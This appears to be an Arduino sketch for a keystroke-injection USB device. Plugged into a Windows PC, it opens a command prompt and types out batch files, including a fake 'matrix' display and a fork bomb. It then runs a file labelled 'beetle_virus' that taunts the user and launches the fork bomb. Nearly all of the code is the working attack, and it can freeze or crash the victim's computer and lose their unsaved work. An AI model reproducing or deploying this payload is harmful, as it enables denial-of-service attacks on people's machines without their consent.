#include <Keyboard.h>

void setup() {
  pinMode(13, OUTPUT);
  
  // setup keyboard library
  Keyboard.begin();
  delay(1000);

  // open command promt with run dialogue
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(1);
  Keyboard.releaseAll();

  delay(100);

  // create new empty files
  Keyboard.print("copy /Y NUL begin.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  // create new empty files
  Keyboard.print("copy /Y NUL matrix.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("copy /Y NUL bomb.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("copy /Y NUL beetle_virus.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);

//  // open begin file for editing
//  Keyboard.print("notepad begin.bat");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.releaseAll();
//  delay(100);
//  // enter file contents here
//  Keyboard.print(":restart\nstart /wait beetle_virus\ngoto restart");
//  // save  file
//  Keyboard.press(KEY_LEFT_CTRL);
//  Keyboard.press('s');
//  delay(1);
//  Keyboard.releaseAll();
//  delay(100);
//  // close file
//  Keyboard.press(KEY_LEFT_ALT);
//  Keyboard.press(KEY_F4);
//  delay(1);
//  Keyboard.releaseAll();
//  delay(100);

  // open matrix file for editing
  Keyboard.print("notepad matrix.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  // enter file contents here
  Keyboard.print("\"echo off\ncolor 0a\n:x\necho %random% %random% %random% %random% %random% %random% %random% ");
  Keyboard.print("%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% ");
  Keyboard.print("%random% %random% %random% %random% %random% %random% %random% %random% %random% %random%\ngoto :x");
  // save  file
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  delay(1);
  Keyboard.releaseAll();
  delay(100);
  // close file
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(1);
  Keyboard.releaseAll();
  delay(100);

  // open bomb file for editing
  Keyboard.print("notepad bomb.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  // enter file contents here
  Keyboard.print(":fork\nstart %0\ngoto :fork");
  // save  file
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  delay(1);
  Keyboard.releaseAll();
  delay(100);
  // close file
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(1);
  Keyboard.releaseAll();
  delay(100);

  // open virus file for editing
  Keyboard.print("notepad beetle_virus.bat");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  // enter file contents here
  Keyboard.print("\"echo off\necho Hello!!\nPING 1.1.1.1 -n 1 -w 2000 >NUL\necho.\n");
  Keyboard.print("echo You probably shouldn't have plugged that in...\nPING 1.1.1.1 -n 1 -w 2000 >NUL\necho.\n");
  Keyboard.print("TIMEOUT /T 10\nstart /max matrix\nPING 1.1.1.1 -n 1 -w 10000 >NUL\necho Starting virus...\n");
  Keyboard.print("TIMEOUT /T 10\nstart bomb");
  // save  file
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  delay(1);
  Keyboard.releaseAll();
  delay(100);
  // close file
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(1);
  Keyboard.releaseAll();
  delay(100);

  // run virus file
  //Keyboard.print("start begin");
  Keyboard.print("start beetle_virus");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();    
  
  Keyboard.end();  
}



void loop() {
  // flash for victory!!
  digitalWrite(13, LOW);
  delay(500);
  digitalWrite(13, HIGH);
  delay(500);
}
